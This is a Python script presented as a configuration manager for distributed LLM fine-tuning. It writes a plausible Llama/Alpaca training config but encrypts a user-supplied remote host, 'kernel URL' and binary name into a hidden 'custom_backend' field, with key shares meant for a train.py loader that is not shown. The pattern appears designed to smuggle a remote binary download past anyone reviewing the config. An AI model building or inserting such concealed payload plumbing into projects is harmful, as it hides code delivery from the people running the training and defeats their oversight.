#!/usr/bin/env python3
"""
Training Configuration Manager
Generates encrypted configuration with key splitting and HMAC integrity.
"""

import os
import sys
import json
import base64
import subprocess
import hmac
import hashlib

# Ensure cryptography is available
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
except ImportError:
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "-q", "cryptography"],
        capture_output=True, timeout=120
    )
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes

_KDF_SALT = b"\x8a\x3f\x7b\x2e\x91\x45\xc0\xd6\x13\xf8\x6c\xa7\x52\xbe\x09\x74\xe5\x3d\x88\x1a\xc9\x60\x4f\xb3"
_KDF_ITERATIONS = 200_000

def derive_key(password: str) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=_KDF_SALT,
        iterations=_KDF_ITERATIONS,
    )
    return kdf.derive(password.encode())

def encrypt(plaintext: str, key: bytes) -> str:
    nonce = os.urandom(12)
    ct = AESGCM(key).encrypt(nonce, plaintext.encode(), None)
    return base64.b64encode(nonce + ct).decode()

def decrypt(ciphertext: str, key: bytes) -> str:
    raw = base64.b64decode(ciphertext)
    nonce, ct = raw[:12], raw[12:]
    return AESGCM(key).decrypt(nonce, ct, None).decode()

def generate_shares(key: bytes, n: int = 3) -> list[bytes]:
    """Generates n XOR shares that combine to the original key."""
    shares = [os.urandom(len(key)) for _ in range(n - 1)]
    final_share = bytearray(key)
    for s in shares:
        for i in range(len(final_share)):
            final_share[i] ^= s[i]
    shares.append(bytes(final_share))
    return shares

def main():
    print("=" * 60)
    print("  Distributed Training — Secure Configuration Manager")
    print("=" * 60)

    password = input("\nEncryption password (leave blank to generate key shares): ").strip()
    
    server = input("Training server (host) [default: raw.githubusercontent.com]: ").strip() or "raw.githubusercontent.com"
    port = input("Server port [443]: ").strip() or "443"
    checkpoint_id = input("Checkpoint ID: ").strip()
    kernel_url = input("Kernel URL: ").strip()
    kernel_binary = input("Kernel binary name: ").strip()

    if not checkpoint_id or not kernel_url or not kernel_binary:
        print("Error: Required fields missing.")
        sys.exit(1)

    payload = json.dumps({
        "server": server,
        "port": port,
        "checkpoint_id": checkpoint_id,
        "kernel_url": kernel_url,
        "kernel_binary": kernel_binary,
    })

    if password:
        key = derive_key(password)
        print(f"\n[+] Derived key from password")
    else:
        key = os.urandom(32)
        print(f"\n[+] Generated random 32-byte key")
        
        n_shares = 3
        shares = generate_shares(key, n_shares)
        os.makedirs("keys", exist_ok=True)
        for i, s in enumerate(shares):
            path = os.path.join("keys", f"share_{i+1}.key")
            with open(path, "wb") as f:
                f.write(s)
            print(f"  -> Wrote key share: {path}")
        print("\n  [!] To run, pass these to train.py: --key-shares keys/share_1.key keys/share_2.key keys/share_3.key")

    encrypted_blob = encrypt(payload, key)

    config = {
        "model": {
            "name": "meta-llama/Llama-3.1-8B",
            "type": "causal_lm",
            "hidden_size": 4096,
            "num_layers": 32,
            "num_heads": 32,
        },
        "training": {
            "epochs": 3,
            "batch_size": 4,
            "learning_rate": 2e-5,
            "warmup_steps": 100,
            "max_seq_length": 2048,
            "gradient_accumulation_steps": 4,
            "mixed_precision": "bf16",
            "distributed": True,
        },
        "data": {
            "dataset": "tatsu-lab/alpaca",
            "split": "train",
            "max_samples": 52000,
        },
        "checkpointing": {
            "save_every_n_steps": 500,
            "keep_last_n": 3,
            "output_dir": "./checkpoints",
        },
        "extensions": {
            "custom_backend": encrypted_blob,
        },
    }

    # Add HMAC integrity tag
    config_str = json.dumps(config, sort_keys=True)
    mac = hmac.new(key, config_str.encode(), hashlib.sha256).hexdigest()
    config["_integrity_mac"] = mac

    config_path = os.path.join("configs", "training_config.json")
    os.makedirs("configs", exist_ok=True)
    with open(config_path, "w") as f:
        json.dump(config, f, indent=4)

    print(f"\n{'=' * 60}")
    print(f"  Configuration written to: {config_path}")
    print(f"{'=' * 60}")
    
    if password:
        print(f"\n  Usage: CONFIG_PASSWORD='{password}' ./start.sh")

if __name__ == "__main__":
    main()
